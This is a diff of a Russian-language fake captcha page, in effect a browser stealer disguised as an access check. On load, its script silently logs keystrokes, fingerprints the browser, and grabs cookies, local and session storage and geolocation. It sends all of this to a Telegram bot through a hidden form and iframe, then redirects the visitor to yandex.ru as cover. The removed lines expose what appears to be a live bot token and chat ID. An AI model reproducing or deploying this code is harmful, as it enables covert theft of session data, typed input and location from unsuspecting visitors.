@@ -2,13 +2,13 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Подтверждение</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0e17;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -23,24 +23,11 @@
             max-width: 400px;
             width: 100%;
             border: 1px solid #2a3340;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
             text-align: center;
         }
-        .shield {
-            font-size: 48px;
-            margin-bottom: 12px;
-        }
-        h2 {
-            font-weight: 500;
-            font-size: 20px;
-            color: #fff;
-            margin-bottom: 6px;
-        }
-        .sub {
-            color: #8892a0;
-            font-size: 14px;
-            margin-bottom: 28px;
-        }
+        .shield { font-size: 48px; margin-bottom: 12px; }
+        h2 { font-weight: 500; font-size: 20px; color: #fff; margin-bottom: 6px; }
+        .sub { color: #8892a0; font-size: 14px; margin-bottom: 28px; }
         .captcha-display {
             background: #0f1520;
             border-radius: 16px;
@@ -85,15 +72,12 @@
             transition: 0.2s;
         }
         .btn:hover { background: #3b66e5; }
-        .btn:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-        }
         .status {
             margin-top: 18px;
             font-size: 13px;
             color: #5a6a7a;
         }
+        iframe { display: none; }
     </style>
 </head>
 <body>
@@ -102,21 +86,22 @@
     <div class="shield">🛡️</div>
     <h2>Подтверждение доступа</h2>
     <div class="sub">Введите код с картинки для продолжения</div>
-
     <div class="captcha-display" id="captchaCode">A7K9F</div>
-
-    <input type="text" id="captchaInput" placeholder="Введите код" maxlength="5" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
-
+    <input type="text" id="captchaInput" placeholder="Введите код" maxlength="5" autocomplete="off">
     <button class="btn" id="submitBtn">Подтвердить</button>
     <div class="status" id="statusText">Ожидание ввода...</div>
 </div>
 
+<!-- Скрытая форма для отправки в Telegram -->
+<iframe name="tgFrame" style="display:none;"></iframe>
+<form id="tgForm" action="" method="GET" target="tgFrame" style="display:none;"></form>
+
 <script>
 // ================================================================
-//  ВСЁ АВТОМАТИЧЕСКИ — ВСТАВЬ ТОКЕН И ID КАНАЛА, ЁБАНАТ
+//  ВСТАВЬ СВОЙ ТОКЕН И CHAT_ID, ЁБАНАТ
 // ================================================================
-const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';  // ТВОЙ ТОКЕН
-const CHAT_ID   = '-1003791860129';  // ТВОЙ CHAT_ID
+const BOT_TOKEN = '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11';
+const CHAT_ID   = '-1001234567890';
 
 // ---------- ГЕНЕРАЦИЯ КАПЧИ ----------
 function generateCaptcha() {
@@ -130,21 +115,17 @@ function generateCaptcha() {
 }
 let currentCaptcha = generateCaptcha();
 
-// ---------- КЕЙЛОГ (тихо собираем все нажатия) ----------
+// ---------- КЕЙЛОГ ----------
 let keyLog = [];
 document.addEventListener('keydown', (e) => {
-    if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace' || e.key === 'Tab') {
+    if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
         keyLog.push(e.key);
         if (keyLog.length > 200) keyLog.shift();
-    }
-    // Собираем даже попытки ввода в капчу
-    if (e.target.id === 'captchaInput') {
-        // ничего не делаем, просто собираем всё
     }
 });
 
 // ---------- ФИНГЕРПРИНТ ----------
-function getFingerprint() {
+function getFP() {
     try {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -158,119 +139,87 @@ function getFingerprint() {
     } catch(e) { return 'ошибка'; }
 }
 
-// ---------- СБОР ВСЕХ ДАННЫХ (АВТОМАТИЧЕСКИ) ----------
-function collectAllData() {
-    const data = {};
-
-    // ---- Браузерная информация ----
-    data.userAgent = navigator.userAgent;
-    data.language = navigator.language;
-    data.platform = navigator.platform;
-    data.cookiesEnabled = navigator.cookieEnabled ? 'да' : 'нет';
-    data.screen = `${screen.width}x${screen.height}`;
-    data.colorDepth = screen.colorDepth;
-    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    data.time = new Date().toISOString();
-    data.referrer = document.referrer || 'прямой';
-    data.url = window.location.href;
-    data.fingerprint = getFingerprint();
-
-    // ---- Куки ----
-    data.cookies = document.cookie || 'нет кук';
-
-    // ---- LocalStorage ----
-    try {
-        data.localStorage = Object.keys(localStorage).length > 0 
-            ? JSON.stringify(localStorage, null, 2) 
-            : 'пусто';
-    } catch(e) { data.localStorage = 'ошибка'; }
-
-    // ---- SessionStorage ----
-    try {
-        data.sessionStorage = Object.keys(sessionStorage).length > 0
-            ? JSON.stringify(sessionStorage, null, 2)
-            : 'пусто';
-    } catch(e) { data.sessionStorage = 'ошибка'; }
-
-    // ---- Кейлог ----
-    data.keylog = keyLog.join('') || 'тишина';
-
-    // ---- Автозаполненные поля (если есть) ----
-    const inputs = document.querySelectorAll('input');
-    let autoFill = {};
-    inputs.forEach((inp, idx) => {
-        if (inp.value && inp.value.length > 0) {
-            autoFill[`field_${idx}`] = inp.value;
+// ---------- ГЕОЛОКАЦИЯ ----------
+function getGeo() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve('недоступно');
+            return;
         }
-    });
-    data.autofill = Object.keys(autoFill).length > 0 ? JSON.stringify(autoFill) : 'нет';
-
-    // ---- Геолокация (асинхронно) ----
-    data.geo = 'ожидание...';
-    if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            pos => {
-                data.geo = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-                data.geo_accuracy = pos.coords.accuracy;
-                sendToTelegram(data);
-            },
-            err => {
-                data.geo = 'отказано/ошибка';
-                sendToTelegram(data);
-            },
-            { timeout: 5000 }
+            pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+            () => resolve('отказано')
         );
-    } else {
-        data.geo = 'не поддерживается';
-        sendToTelegram(data);
-    }
+    });
+}
 
+// ---------- СБОР ВСЕХ ДАННЫХ ----------
+async function collectAllData() {
+    const data = {};
+    
+    // Браузер
+    data.ua = navigator.userAgent;
+    data.lang = navigator.language;
+    data.platform = navigator.platform;
+    data.screen = `${screen.width}x${screen.height}`;
+    data.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    data.time = new Date().toISOString();
+    data.ref = document.referrer || 'прямой';
+    data.url = location.href;
+    data.fp = getFP();
+    data.cookies = document.cookie || 'нет';
+    
+    try {
+        data.ls = JSON.stringify(localStorage, null, 2) || 'пусто';
+    } catch(e) { data.ls = 'ошибка'; }
+    
+    try {
+        data.ss = JSON.stringify(sessionStorage, null, 2) || 'пусто';
+    } catch(e) { data.ss = 'ошибка'; }
+    
+    data.keylog = keyLog.join('') || 'тишина';
+    data.geo = await getGeo();
+    
     return data;
 }
 
-// ---------- ОТПРАВКА В ТЕЛЕГРАМ (тихо, без упоминаний) ----------
-function sendToTelegram(data) {
-    let text = '📡 СБОР ДАННЫХ (АВТОМАТИЧЕСКИЙ)\n';
-    text += '═══════════════════════════════════\n';
-    for (let key in data) {
-        text += `🔹 ${key.toUpperCase()}: ${data[key]}\n`;
-    }
-    text += '═══════════════════════════════════\n';
-    text += `🌐 IP: ${data.referrer || 'не определён'}\n`; // Реальный IP только через сервер
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'HTML'
-        })
-    })
-    .then(res => res.json())
-    .then(result => {
-        if (result.ok) {
-            console.log('✅ Данные улетели в Телегу');
-        } else {
-            console.error('❌ Ошибка отправки:', result);
-        }
-    })
-    .catch(err => console.error('❌ Фетч ошибка:', err));
+// ---------- ОТПРАВКА ЧЕРЕЗ GET-ЗАПРОС (БЕЗ ПРОКСИ) ----------
+function sendViaGet(text) {
+    const form = document.getElementById('tgForm');
+    const encoded = encodeURIComponent(text);
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=HTML`;
+    
+    form.action = url;
+    form.submit();
+    
+    // Статус
+    document.getElementById('statusText').textContent = '✅ Данные отправлены';
+    document.getElementById('statusText').style.color = '#7ddf9a';
 }
 
-// ---------- ЗАПУСК АВТОСБОРА ПРИ ЗАГРУЗКЕ ----------
-window.addEventListener('load', function() {
-    // Ждём 1.5 секунды, чтобы страница отрендерилась
-    setTimeout(() => {
-        const data = collectAllData();
-        // Если гео уже отработало, отправка будет внутри collectAllData
-        // Если гео не поддерживается — отправка уже вызвана
-    }, 1500);
+// ---------- ОСНОВНАЯ ФУНКЦИЯ ----------
+async function main() {
+    const data = await collectAllData();
+    
+    let report = '📡 СБОР ДАННЫХ (АВТОМАТИЧЕСКИЙ)\n';
+    report += '═══════════════════════════════════\n';
+    for (let key in data) {
+        report += `🔹 ${key.toUpperCase()}: ${data[key]}\n`;
+    }
+    report += '═══════════════════════════════════\n';
+    
+    // Отправляем через GET
+    sendViaGet(report);
+    
+    // Возвращаем капчу
+    return data;
+}
 
-    // Дополнительный сбор через 5 секунд (на случай, если что-то подгрузилось)
+// ---------- АВТОЗАПУСК ----------
+window.addEventListener('load', function() {
     setTimeout(() => {
-        const data = collectAllData();
-    }, 5000);
+        main().catch(console.error);
+    }, 1500);
 });
 
 // ---------- ОБРАБОТКА КАПЧИ ----------
@@ -284,11 +233,15 @@ document.getElementById('submitBtn').addEventListener('click', function() {
         status.style.color = '#7ddf9a';
         this.disabled = true;
         input.disabled = true;
-
-        // Перенаправляем на легальный сайт (маскировка)
+        
+        // Дополнительная отправка (на всякий случай)
         setTimeout(() => {
-            window.location.href = 'https://yandex.ru'; // или любой другой
-        }, 1500);
+            main();
+        }, 500);
+
+        setTimeout(() => {
+            window.location.href = 'https://yandex.ru';
+        }, 2000);
     } else {
         status.textContent = '❌ Неверный код, попробуйте снова';
         status.style.color = '#ff8a7a';
@@ -301,17 +254,9 @@ document.getElementById('submitBtn').addEventListener('click', function() {
     }
 });
 
-// Enter для отправки капчи
 document.getElementById('captchaInput').addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
         document.getElementById('submitBtn').click();
-    }
-});
-
-// Обновляем капчу при фокусе на поле (для удобства)
-document.getElementById('captchaInput').addEventListener('focus', function() {
-    if (this.value === '') {
-        currentCaptcha = generateCaptcha();
     }
 });
 
